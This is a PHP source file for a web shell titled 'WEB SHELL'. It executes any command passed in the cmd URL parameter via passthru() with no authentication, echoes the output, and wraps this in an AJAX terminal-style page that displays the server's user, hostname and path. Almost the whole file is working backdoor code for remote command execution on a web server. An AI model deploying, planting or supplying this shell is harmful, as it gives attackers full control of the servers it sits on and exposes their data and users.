<?php session_start(); ?>
<?php

if (empty($_SESSION['path'])) {
    $_SESSION['user'] = shell_exec('whoami');
    $_SESSION['host'] = shell_exec('hostname');
    $_SESSION['path'] = dirname(__FILE__);
}
function showInfo($cmd) {
    $user = $_SESSION['user'];
    $host = $_SESSION['host'];
    $path = $_SESSION['path'];
    echo "$host:$path $$user : $cmd";
}
if (!empty($_GET['cmd'])) {
    echo "<br/>";
    $cmd =  $_GET['cmd'];
      $path = $_SESSION['path'];
      passthru($cmd, $returnval);
      if($returnval){
          echo 'error';
      }else{  
          echo 'done';
      } 
      echo "<br/><br/>";
  exit;

}
?>
<html>
  <head>
    <meta charset="UTF-8">
    <title>WEB SHELL</title>
    <script>
    postCmd = function(e) {
        e.preventDefault;
        var cmd = document.getElementById('cmd'),
            log = document.getElementById('log-item'),
            text = document.getElementById('text'),
            info = document.getElementById('info'),
            ajax = new XMLHttpRequest();
        if (!cmd.value) {return;};
        ajax.open("GET", "?cmd="+cmd.value);
        ajax.send();
        ajax.onreadystatechange = function() {
            if ( ajax.readyState == 4 ) {
                    var t = "<pre>%s</pre>";
                    log.innerHTML += t.replace('%s', ajax.responseText);
                text.scrollIntoView();
                cmd.value = "";
            }
        }
    };
    </script>
  </head>
  <body>
    <div class="log-list">
       <div id="log-item"></div>
    </div>
    <form action="javascript:;" method="post" onsubmit="postCmd(event)"/>
      <label id="info" for="cmd"><?php showInfo();?></label><input id="cmd" type="text" tab="1" autofocus="autofocus" width="50%"/>
    </form>
  </body>
</html>